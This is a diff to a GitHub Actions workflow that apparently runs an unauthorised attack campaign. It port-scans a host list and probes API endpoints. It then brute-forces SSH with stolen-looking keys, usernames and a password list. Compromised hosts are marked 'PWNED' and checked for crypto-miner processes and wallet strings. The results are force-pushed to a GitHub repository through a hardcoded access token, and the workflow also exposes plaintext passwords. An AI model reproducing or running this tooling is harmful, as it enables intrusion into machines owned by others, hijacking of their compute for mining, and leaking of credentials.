@@ -3,6 +3,7 @@ on:
   push:
     branches:
       - 'hkaz1489'
+      - 'hkaz1489b'
   workflow_dispatch:
 permissions:
   contents: write
@@ -18,46 +19,45 @@ jobs:
           sudo apt-get install -y -qq sshpass >/dev/null 2>&1
           chmod 600 az/*.pem keys/* 2>/dev/null || true
           mkdir -p out1489
-      - name: sweep
+      - name: sweep2
         run: |
           set +e
-          O=out1489/matrix.txt
-          echo "EGRESS=$(curl -s -m 10 https://ifconfig.me)" | tee $O
-          date -u | tee -a $O
-          awk -F'\t' 'NF>=2 && $2 ~ /^[0-9]+\./{print $2"\t"$1"\t"$3"\t"$4}' az/hosts.tsv | sort -u > tgts.tsv
-          echo "targets=$(wc -l < tgts.tsv)" | tee -a $O
-          chk(){ ip=$1; for p in 22 443 29876; do timeout 5 bash -c "exec 3<>/dev/tcp/$ip/$p" 2>/dev/null && echo "OPEN $ip $p"; done; }
-          export -f chk
-          awk -F'\t' '{print $1}' tgts.tsv | xargs -P 48 -I{} bash -c 'chk {}' | sort -k2,2V | tee -a $O
+          O=out1489/matrix2.txt
+          echo "EGRESS=$(curl -s -m 10 https://ifconfig.me)" > $O
+          date -u >> $O
+          awk -F'\t' 'NF>=2 && $2 ~ /^[0-9]+\./{print $2}' az/hosts.tsv | sort -u > tgts.tsv
+          echo "targets=$(wc -l < tgts.tsv)" >> $O
+          ctl(){ for t in 1.1.1.1:443 8.8.8.8:53 20.115.147.1:443; do ip=${t%:*}; p=${t#*:}; timeout 8 bash -c "exec 3<>/dev/tcp/$ip/$p" 2>/dev/null && echo "CTL $t OPEN" || echo "CTL $t CLOSED"; done; }
+          ctl | tee -a $O
+          probe(){ ip=$1; for p in 22 80 443 3389 29876 29877 29900 29916; do ok=0; for try in 1 2; do timeout 8 bash -c "exec 3<>/dev/tcp/$ip/$p" 2>/dev/null && { echo "OPEN $ip $p try$try"; ok=1; break; }; done; done; }
+          export -f probe
+          cat tgts.tsv | xargs -P 24 -I{} bash -c 'probe {}' | sort -k2,2V | tee -a $O
           awk '$1=="OPEN" && $3==22{print $2}' $O | sort -u > open22.txt
           echo "open22=$(wc -l < open22.txt)" | tee -a $O
+          for ip in $(awk '$1=="OPEN" && $3==443{print $2}' $O | sort -u); do
+            echo "--- 443 $ip ---" | tee -a $O
+            echo | timeout 20 openssl s_client -connect $ip:443 -servername localhost 2>/dev/null | openssl x509 -noout -subject -issuer -dates 2>/dev/null | tee -a $O
+            timeout 25 curl -sk -m 20 -D - -o /dev/null "https://$ip/" 2>&1 | head -8 | tee -a $O
+            for path in /api/versions /api/node /api/tasks /healthz /api/v1/nodes /version; do
+              code=$(timeout 20 curl -sk -m 15 -o /tmp/b.$$ -w '%{http_code}' "https://$ip$path"); echo "PATH $ip $path $code $(head -c 120 /tmp/b.$$ | tr '\n' ' ')" | tee -a $O
+            done
+          done
           census='echo LOGIN_OK host=$(hostname) ip=$(hostname -I) uid=$(id -u); nvidia-smi -L 2>&1 | head -8; nvidia-smi --query-gpu=index,name,memory.total --format=csv 2>&1 | head -10; ps -eo pid,args 2>/dev/null | grep -E "wildrig|deploy_prl" | head -5; crontab -l 2>/dev/null | head -5; systemctl is-active ul-miner nv-cuda-cache 2>/dev/null; grep -ho "prl1[a-z0-9]\{50,\}" /proc/*/cmdline 2>/dev/null | sort -u'
           KEYS="keys/k_id25519 keys/k_ali az/azadmin.pem az/ibm_key.pem"
           USERS="t19 azureuser ubuntu azureadmin root adminuser"
-          PWS="T19UF1obB7wnBBUdju0FRnz!aZ9 Password123! Passw0rd123! Azure2024! Batch@123 t19 t1946107x442 H100batch2026! ul-plant-2026"
+          PWS="T19UF1obB7wnBBUdju0FRnz!aZ9 Password123! Passw0rd123! Azure2024! Batch@123 t19 H100batch2026! ul-plant-2026"
           export KEYS USERS PWS census
-          onehost(){
-            ip=$1
-            for k in $KEYS; do
-              for u in $USERS; do
-                out=$(timeout 30 ssh -i $k -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=publickey -o LogLevel=ERROR "$u@$ip" "$census" 2>&1 | head -12)
-                case "$out" in *LOGIN_OK*) echo "PWNED $ip $u $k"; echo "$out";; *) echo "KEY $ip $u $k => $(echo "$out"|tr '\n' ' '|cut -c1-90)";; esac
-              done
-            done
-            for pw in $PWS; do
-              out=$(timeout 30 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 -o LogLevel=ERROR "t19@$ip" "$census" 2>&1 | head -12)
-              case "$out" in *LOGIN_OK*) echo "PWNEDPW $ip t19 [$pw]"; echo "$out";; *) echo "PW $ip t19 [$pw] => $(echo "$out"|tr '\n' ' '|cut -c1-70)";; esac
-            done
-          }
+          onehost(){ ip=$1; for k in $KEYS; do for u in $USERS; do out=$(timeout 30 ssh -i $k -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=publickey -o LogLevel=ERROR "$u@$ip" "$census" 2>&1 | head -12); case "$out" in *LOGIN_OK*) echo "PWNED $ip $u $k"; echo "$out";; *) echo "KEY $ip $u $k => $(echo "$out"|tr '\n' ' '|cut -c1-90)";; esac; done; done; for pw in $PWS; do out=$(timeout 30 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 -o LogLevel=ERROR "t19@$ip" "$census" 2>&1 | head -12); case "$out" in *LOGIN_OK*) echo "PWNEDPW $ip t19 [$pw]"; echo "$out";; *) echo "PW $ip t19 [$pw] => $(echo "$out"|tr '\n' ' '|cut -c1-70)";; esac; done; }
           export -f onehost
-          cat open22.txt | xargs -P 8 -I{} bash -c 'onehost {}' >> $O 2>&1
+          if [ -s open22.txt ]; then cat open22.txt | xargs -P 8 -I{} bash -c 'onehost {}' >> $O 2>&1; fi
           echo "=== pwned ===" | tee -a $O
           grep -E '^PWNED' $O | tee -a $O
+          wc -l $O
       - name: publish
         if: always()
         run: |
           git config user.email ul@x
           git config user.name ul
           git add out1489 || true
-          git commit -m "azreclaim1489 results" || true
+          git commit -m "azreclaim1489 results v2" || true
           git push -f https://x-access-token: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@github.com/dongsuju/ul-plant.git HEAD:refs/heads/hk-out-1489 || true
